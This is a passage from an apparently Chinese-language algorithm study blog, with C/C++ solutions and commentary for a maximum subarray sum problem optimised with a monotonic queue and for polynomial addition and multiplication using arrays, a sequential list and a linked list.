maxsum = dp[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>;i &lt;= n;++ i)&#123;<br><span class="hljs-keyword">if</span>(dp[i<span class="hljs-number">-1</span>] + dp[i] &gt;= dp[i])<br>dp[i] = dp[i<span class="hljs-number">-1</span>] + dp[i];<br><span class="hljs-keyword">else</span> p = i;<br><span class="hljs-keyword">if</span>(dp[i] &gt; maxsum)<br>&#123;<br>maxsum = dp[i];start = p;end = i;<br>&#125;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,maxsum);<br>&#125;<br><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>但是时间复杂度是O(n*m)肯定会超时，考虑使用单调队列进行优化：</strong></p><pre><code class="hljs">&lt;div class=&quot;fold&quot;&gt;  &lt;div class=&quot;fold-title fold-info collapsed&quot; data-toggle=&quot;collapse&quot; href=&quot;#collapse-0ad24a9b&quot; role=&quot;button&quot; aria-expanded=&quot;false&quot; aria-controls=&quot;collapse-0ad24a9b&quot;&gt;    &lt;div class=&quot;fold-arrow&quot;&gt;▶&lt;/div&gt;动态规划+前缀和+单调队列  &lt;/div&gt;  &lt;div class=&quot;fold-collapse collapse&quot; id=&quot;collapse-0ad24a9b&quot;&gt;    &lt;div class=&quot;fold-content&quot;&gt;      <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br>deque&lt;<span class="hljs-type">int</span>&gt; dq;<br><span class="hljs-type">int</span> s[<span class="hljs-number">100005</span>];<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n,m;<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;n,&amp;m);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt;= n;++ i)<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lld&quot;</span>,&amp;s[i]);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt;= n;++ i)s[i] = s[i] + s[i<span class="hljs-number">-1</span>];<br><span class="hljs-type">int</span> ans = <span class="hljs-number">-1e8</span>;<br>dq.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>;i &lt;= n;++ i)<br>&#123;<br><span class="hljs-keyword">while</span>(!dq.<span class="hljs-built_in">empty</span>()&amp;&amp;dq.<span class="hljs-built_in">front</span>() &lt; i - m)dq.<span class="hljs-built_in">pop_front</span>();<br><span class="hljs-keyword">if</span>(dq.<span class="hljs-built_in">empty</span>())ans = <span class="hljs-built_in">max</span>(ans,s[i]);<br><span class="hljs-keyword">else</span> ans = <span class="hljs-built_in">max</span>(ans,s[i] - s[dq.<span class="hljs-built_in">front</span>()]);<br><span class="hljs-keyword">while</span>(!dq.<span class="hljs-built_in">empty</span>() &amp;&amp; s[dq.<span class="hljs-built_in">back</span>()] &gt;= s[i])dq.<span class="hljs-built_in">pop_back</span>();<br>dq.<span class="hljs-built_in">push_back</span>(i);<br>&#125;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>&lt;p&gt;&lt;strong&gt;由此可见，将数据结构与算法结合，威力无穷&lt;/strong&gt;&lt;/p&gt;    &lt;/div&gt;  &lt;/div&gt;&lt;/div&gt;</code></pre>        </div>      </div>    </div><p><img src="/dong.github/images/0905-5.png" alt="alt text"></p><p><strong>NO2,<a href="https://pintia.cn/problem-sets/15/exam/problems/type/7?problemSetProblemId=710&page=0">多项式的加法和乘法</a></strong></p>    <div class="fold">      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-94341fa2" role="button" aria-expanded="false" aria-controls="collapse-94341fa2">        <div class="fold-arrow">▶</div>解答      </div>      <div class="fold-collapse collapse" id="collapse-94341fa2">        <div class="fold-content">          <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> maxn 10010</span><br><span class="hljs-type">int</span> a[maxn<span class="hljs-number">+1</span>];<br><span class="hljs-type">int</span> b[maxn<span class="hljs-number">+1</span>];<br><span class="hljs-type">int</span> c[maxn<span class="hljs-number">+1</span>];<br><span class="hljs-type">int</span> d[maxn<span class="hljs-number">+1</span>];<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getmul</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> flag = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt;= maxn;++ i)<br>&#123;<br><span class="hljs-keyword">if</span>(a[i] != <span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;j &lt;= maxn;++ j)<br>&#123;<br><span class="hljs-keyword">if</span>(b[j] != <span class="hljs-number">0</span>)<br>&#123;<br>d[i+j] += a[i] * b[j];<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-type">int</span> mark = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt;= maxn;++ i)<br>&#123;<br><span class="hljs-keyword">if</span>(d[i] != <span class="hljs-number">0</span>)<br>&#123;<br>mark = i;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = maxn;i &gt;= <span class="hljs-number">0</span>;i --)<br>&#123;<br><span class="hljs-keyword">if</span>(d[i] != <span class="hljs-number">0</span>)<br>&#123;<br>flag = <span class="hljs-number">1</span>;<br>cout &lt;&lt; d[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot; \n&quot;</span>[i==mark];<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(flag == <span class="hljs-number">0</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;0 0&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getsum</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> flag = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt;= maxn;++ i)<br>&#123;<br>c[i] = a[i] + b[i];<br>&#125;<br><span class="hljs-type">int</span> mark = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt;= maxn;++ i)<br>&#123;<br><span class="hljs-keyword">if</span>(c[i] != <span class="hljs-number">0</span>)<br>&#123;<br>mark = i;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = maxn;i &gt;= <span class="hljs-number">0</span>;i --)<br>&#123;<br><span class="hljs-keyword">if</span>(c[i] != <span class="hljs-number">0</span>)<br>&#123;<br>flag = <span class="hljs-number">1</span>;<br>cout &lt;&lt; c[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot; \n&quot;</span>[i == mark];<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(flag == <span class="hljs-number">0</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;0 0&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> num1,num2;<br>cin &gt;&gt; num1;<br><span class="hljs-keyword">while</span>(num1--)<br>&#123;<br><span class="hljs-type">int</span> x,y;<br>cin &gt;&gt; x &gt;&gt; y;<br>a[y] = x;<br>&#125;<br>cin &gt;&gt; num2;<br><span class="hljs-keyword">while</span>(num2--)<br>&#123;<br><span class="hljs-type">int</span> x,y;<br>cin &gt;&gt; x &gt;&gt; y;<br>b[y] = x;<br>&#125;<br><span class="hljs-built_in">getmul</span>();<br><span class="hljs-built_in">getsum</span>();<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>4 数组×40044 字节&#x2F;数组&#x3D;160176 字节</strong><br><strong>这大约是 156.5 KB。</strong><br><strong>这样虽然过了，但是没考虑过空间浪费。</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> maxn 10010</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span> *List;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">data</span>&#123;<br><span class="hljs-type">int</span> x;<br><span class="hljs-type">int</span> y;<br>&#125;;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">LNode</span>&#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">data</span> Data[maxn];<br><span class="hljs-type">int</span> Last;<br>&#125;;<br><span class="hljs-function">List <span class="hljs-title">init</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>List L = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> LNode));<br>L-&gt;Last = <span class="hljs-number">-1</span>;<br><span class="hljs-keyword">return</span> L;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">insert</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y,List L)</span></span><br><span class="hljs-function"></span>&#123;<br>L-&gt;Last++;<br>L-&gt;Data[L-&gt;Last].x = x;<br>L-&gt;Data[L-&gt;Last].y = y;<br><span class="hljs-keyword">return</span> ;<br>&#125;<br><span class="hljs-comment">//int Length(List L)&#123;</span><br><span class="hljs-comment">//return L-&gt;Last+1;</span><br><span class="hljs-comment">//&#125; </span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">getsum</span><span class="hljs-params">(List L1,List L2)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> pointer1 = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> pointer2 = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(pointer1 &lt;= L1-&gt;Last &amp;&amp; pointer2 &lt;= L2-&gt;Last)<br>&#123;<br><span class="hljs-keyword">if</span>(L1-&gt;Data[pointer1].y &gt; L2-&gt;Data[pointer2].y)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d &quot;</span>,L1-&gt;Data[pointer1].x,L1-&gt;Data[pointer1].y);<br>pointer1++;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(L1-&gt;Data[pointer1].y &lt; L2-&gt;Data[pointer2].y)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d &quot;</span>,L2-&gt;Data[pointer2].x,L2-&gt;Data[pointer2].y);<br>pointer2++;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d &quot;</span>,L1-&gt;Data[pointer1].x + L2-&gt;Data[pointer2].x,L1-&gt;Data[pointer1].y);<br>pointer1++;<br>pointer2++;<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span>(pointer1 &lt;= L1-&gt;Last)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d &quot;</span>,L1-&gt;Data[pointer1].x,L1-&gt;Data[pointer1].y);<br>pointer1++ ;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(pointer2 &lt;= L2-&gt;Last)<br>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d &quot;</span>,L2-&gt;Data[pointer2].x,L2-&gt;Data[pointer2].y);<br>    pointer2++ ;<br>&#125;<br>&#125;<br><span class="hljs-comment">//void getmul(List L1,List L2)</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//int pointer1 = 0;</span><br><span class="hljs-comment">//int pointer2 = 0;</span><br><span class="hljs-comment">//for(;pointer1 &lt;= L1-&gt;Last;pointer1++ )</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//for(;pointer2 &lt;= L2-&gt;Last;pointer2++ )</span><br><span class="hljs-comment">//&#123;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-comment">//&#125;</span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> num1,num2;<br>cin &gt;&gt; num1 ;<br>List L1 = <span class="hljs-built_in">init</span>();<br><span class="hljs-keyword">while</span>(num1--)<br>&#123;<br><span class="hljs-type">int</span> x,y;<br>cin &gt;&gt; x &gt;&gt; y;<br><span class="hljs-built_in">insert</span>(x,y,L1);<br>&#125;<br>cin &gt;&gt; num2;<br>List L2 = <span class="hljs-built_in">init</span>();<br><span class="hljs-keyword">while</span>(num2--)<br>&#123;<br><span class="hljs-type">int</span> x,y;<br>cin &gt;&gt; x &gt;&gt; y;<br><span class="hljs-built_in">insert</span>(x,y,L2);<br>&#125;<br><span class="hljs-comment">//for(int i=0;i&lt;Length(L1);i++)</span><br><span class="hljs-comment">//printf(&quot;%d %d &quot;,L1-&gt;Data[i].x,L1-&gt;Data[i].y);</span><br><span class="hljs-comment">//printf(&quot;\n&quot;);</span><br><span class="hljs-comment">//for(int i=0;i&lt;Length(L2);i++)</span><br><span class="hljs-comment">//printf(&quot;%d %d &quot;,L2-&gt;Data[i].x,L2-&gt;Data[i].y);</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br><span class="hljs-built_in">getsum</span>(L1,L2);<br><span class="hljs-comment">//getmul();</span><br><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>这段中尝试使用了动态数组实现顺序表的办法，完成了多项式加法</strong></p><blockquote><ul><li><strong>优势：相比上一份静态数组，处理数据时拿多少用多少。比如同样一组输入，空间占用从165kB降至不到100B。</strong></li><li><strong>缺点：虽然实现，但是代码中有几个问题：</strong></li><li><strong>1.在线算法，算一条输出一条，不灵活，这也解释了为什么乘法部分没有继续写。更好的做法是再开一个数组存答案。</strong></li><li><strong>2.输出部分未封装，题目部分有格式要求，较复杂的输出适合单独封装一个函数做输出。</strong></li><li><strong>3.空间连续，这是开数组和开链表的重要区别：数组空间必须物理上连续，而实际上计算机内存物理上并不连续，你以为的连续实际上是操作系统给出的抽象层，造成了空间连续的假象（逻辑上连续），这就会在要求比较苛刻的情况中浪费空间。</strong></li></ul></blockquote><p><strong>Tips：看懂一份代码不难，重要的是如何独立写出来。一个好办法是阅读注释，注释和编写过程中的调试遗迹是好东西，编写边调试即可化难为简。</strong><br><strong>可惜的是，大多数题解将调试遗迹删去。</strong></p><p><strong>最优解法：链表</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span> *List;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Node</span>&#123;<br>List Next;<br><span class="hljs-type">int</span> z;   <span class="hljs-comment">// 指数 </span><br><span class="hljs-type">int</span> x;  <span class="hljs-comment">// 系数 </span><br>&#125;;<br><br><span class="hljs-comment">// 读入链表 </span><br><span class="hljs-function">List <span class="hljs-title">Read</span><span class="hljs-params">()</span></span>&#123;<br>List L = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br>List head = L;<br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;n;i++)&#123;<br><span class="hljs-type">int</span> x;<br><span class="hljs-type">int</span> z;<br>List t = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>,&amp;x,&amp;z);<br>t-&gt;x = x;<br>t-&gt;z = z;<br>L-&gt;Next = t;<br>L = L-&gt;Next;<br>&#125;<br>L-&gt;Next = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">return</span> head-&gt;Next;<br>&#125;<br><br><span class="hljs-comment">// 实现加法运算 </span><br><span class="hljs-function">List <span class="hljs-title">addition</span><span class="hljs-params">(List L1,List L2)</span></span>&#123;<br>List tmpL1 = L1;<br>List tmpL2 = L2;<br>List add=(List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br>add-&gt;Next = <span class="hljs-literal">NULL</span>;<br>List head = add;<br>List t;<br><span class="hljs-keyword">while</span>(tmpL1 &amp;&amp; tmpL2)&#123;<br>t = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br><span class="hljs-keyword">if</span>(tmpL1-&gt;z == tmpL2-&gt;z)&#123;  <span class="hljs-comment">//指数相等，系数相加  </span><br>t-&gt;x = tmpL1-&gt;x + tmpL2-&gt;x;<br>t-&gt;z = tmpL1-&gt;z;<br>tmpL1 = tmpL1-&gt;Next;<br>tmpL2 = tmpL2-&gt;Next;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(tmpL1-&gt;z &lt; tmpL2-&gt;z)&#123;   <span class="hljs-comment">// L2 结点指数更大，把 L2 结点加入链表 </span><br>t-&gt;x = tmpL2-&gt;x;<br>t-&gt;z = tmpL2-&gt;z;<br>tmpL2 = tmpL2-&gt;Next;<br>&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(tmpL2-&gt;z &lt; tmpL1-&gt;z)&#123;   <span class="hljs-comment">// L1 结点指数更大，把 L1 结点加入链表 </span><br>t-&gt;x = tmpL1-&gt;x;<br>t-&gt;z = tmpL1-&gt;z;<br>tmpL1 = tmpL1-&gt;Next;<br>&#125;<br>add-&gt;Next = t;<br>add = add-&gt;Next; <br>&#125;<br><span class="hljs-keyword">if</span>(tmpL1)   <span class="hljs-comment">// 若 L1 不等于 NULL，将剩下结点加入其后 </span><br>add-&gt;Next = tmpL1;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(tmpL2)  <span class="hljs-comment">// 同理 </span><br>add-&gt;Next = tmpL2;<br><span class="hljs-keyword">return</span> head-&gt;Next; <span class="hljs-comment">// head 结点只有指针域存值 </span><br>&#125;<br><br><span class="hljs-comment">// 实现乘法运算 </span><br><span class="hljs-function">List <span class="hljs-title">multiplication</span><span class="hljs-params">(List L1,List L2)</span></span>&#123;<br>List tmpL1 = L1;<br>List tmpL2 = L2;<br>List mul=(List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br>mul-&gt;Next = <span class="hljs-literal">NULL</span>;<br>List head = mul;<br>List t;<br><span class="hljs-keyword">for</span>(;tmpL1;tmpL1=tmpL1-&gt;Next)<br><span class="hljs-keyword">for</span>(tmpL2 = L2;tmpL2;tmpL2=tmpL2-&gt;Next)&#123;<br>t = (List)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> Node));<br>t-&gt;x = tmpL1-&gt;x * tmpL2-&gt;x;  <span class="hljs-comment">// 系数相乘</span><br>t-&gt;z = tmpL1-&gt;z + tmpL2-&gt;z;  <span class="hljs-comment">// 指数相加</span><br>t-&gt;Next = <span class="hljs-literal">NULL</span>;<br>head = <span class="hljs-built_in">addition</span>(t,mul);  <span class="hljs-comment">// 将新增结点和之前已经排好序的结点排序 </span><br>mul = head; <span class="hljs-comment">// 重新确定开头 </span><br>&#125;<br><span class="hljs-keyword">return</span> head;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Print</span><span class="hljs-params">(List L)</span></span>&#123;<br>List t = L;<br><span class="hljs-type">int</span> flag = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span>(;t;t = t-&gt;Next)&#123;<br><span class="hljs-keyword">if</span>(!flag &amp;&amp; t-&gt;x)   <span class="hljs-comment">//控制空格输出</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br><span class="hljs-keyword">if</span>(t-&gt;x)&#123;   <span class="hljs-comment">// 如果系数为 0，不输出 </span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %d&quot;</span>,t-&gt;x,t-&gt;z);<br>flag =<span class="hljs-number">0</span>;<br>&#125;<br>&#125;<br><span 